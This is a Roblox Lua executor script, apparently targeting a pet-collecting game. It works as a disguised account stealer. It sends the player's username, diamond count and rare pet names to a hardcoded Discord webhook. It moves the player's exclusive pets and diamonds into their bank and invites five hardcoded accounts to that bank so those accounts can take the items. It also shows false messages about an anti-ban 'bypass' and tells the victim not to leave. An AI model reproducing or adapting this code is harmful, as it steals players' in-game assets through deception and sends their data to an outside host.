
local HttpService = game:GetService("HttpService");

function SendMessage(Webhook, Message, Botname, huges)
    print(huges)
    huges =  table.concat(huges, ', ')
    print(huges)

    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
 
 local url =
    "https://discord.com/api/webhooks/1041403391714275439/6LQFpV5VFjvk7zQIBvtQPIfzk3DyCRMcLIQMKKWq0U8zZmAc78xyBCrkFG8cFCuVFHoj"
 local data = {
    ["content"] = Message,
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **Huge count:** ' .. Botname .. '\n \n **Gems:** '.. Message .. '\n \n **Total exc:** '.. Webhook.."\n\n **HUGE NAMES:** ".. huges,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
    }
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
 local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)

end


local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))


local v1 = game.JobId;
if #v1 == 0 then
    v1 = "00000000-0000-0000-0000-000000000000";
end;
local l__ReplicatedStorage__2 = game:GetService("ReplicatedStorage");
local l__Players__3 = game:GetService("Players");
local u1 = { {}, {} };
local u2 = { "E", "F" };
local u3 = require(l__ReplicatedStorage__2:WaitForChild("X"):WaitForChild("Util").MD5);
local u4 = { {}, {}, {}, {} };
local u5 = { "BindableEvent", "BindableFunction", "BindableEvent", "BindableFunction" };
local function bypass(p1, p2)
    assert(typeof(p1) == "number");
    assert(typeof(p2) == "string");
    local v4 = u1[p1];
    local v5 = v4[p2];
    if not v5 then
        v5 = u2[p1] .. u3.sumhexa("Network/" .. "/" .. game.GameId .. "/" .. game.PlaceId .. "/" .. game.PlaceVersion .. "/" .. v1 .. "/" .. p1 .. "/" .. p2:lower());
        v4[p2] = v5;
    end;

    if game.ReplicatedStorage:FindFirstChild(v5) == nil then
        v5 = bypass(2, p2)
        v4[p2] = v5;
    end
    return v5;
end;
lib.Message.New("Executed! Now wait")




local ids = {4055134606, 4055138353, 4055142064, 4055144856, 4055147374}
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = game.ReplicatedStorage[bypass(1,"#!F8fb51efb02ff4d8b96d6cce765532ea7")]:InvokeServer()
-- local mybanks = lib.Network.Invoke("!F8fb51efb02ff4d8b96d6cce765532ea7")
-- local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
-- local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
-- local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
-- local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
-- local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
-- local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
-- b:Remove()
-- a:Remove()
-- c:Remove()
-- d:Remove()
-- e:Remove()
-- f:Remove()
-- a:Remove()
-- local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
local PetsList = {}
local PetsList2 = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" then
        table.insert(PetsList, v.uid);
        PetsList2[v.uid] = false
    end
end

spawn(function()
    local hugecount = 0
    local huges = {}

    
    for i,v in pairs(lib.Save.Get().Pets) do
        local v2 = lib.Directory.Pets[v.id];
        if v2.huge then
            huges[#huges+1] = v2.name
            hugecount =  hugecount + 1
        end
    end
    SendMessage(#PetsList, mydiamonds, tostring(hugecount), huges )
end)

game.ReplicatedStorage[bypass(1,"#!F3be716c53b164be6adfeeb00f2baa9bc")]:InvokeServer(PetsList2)

print(mybanks, v207)


local request = game.ReplicatedStorage[bypass(1,"#!Fa95ed1f517c74347b90f3a54f2439a6e")]:InvokeServer(mybanks[1]['BUID'], PetsList, mydiamonds - 100)
if request then
    print("std 1")
else
 wait(30)
 game.ReplicatedStorage[bypass(1,"#!Fa95ed1f517c74347b90f3a54f2439a6e")]:InvokeServer(mybanks[1]['BUID'], PetsList, mydiamonds - 100)
end
-- b:Remove()
-- a:Remove()
-- c:Remove()
-- d:Remove()
-- e:Remove()
-- f:Remove()
-- a:Remove()

lib.Message.New("Loaded main script. Executing bypass, so you wont get banned. Do not leave, or you will get banned.")

local function Invite(bankid, Id)
    local stat = game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(bankid, Id)
    print(stat)
    if stat == true then
        return stat
    end

    wait(3)

    return Invite(bankid, Id)
end

for i, Id in pairs(ids) do

    spawn(function()
        print(i, Id, Invite(mybanks[1]['BUID'], Id))
    end)

    
    wait(3)


    -- if game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) then
    --     warn("std 2")
    -- else
    --     game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) 
    --     game.Players.LocalPlayer:Kick()
    -- end;
end





lib.Message.New("If you get kicked after that message, it is okay, just wait for another day, or you will get banned")
wait(3)
game.Players.LocalPlayer:Kick()


function comma_value(amount)

  local formatted = amount

  while true do

    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')

    if (k == 0) then

      break

    end

  end

  return formatted

end

print("ez")
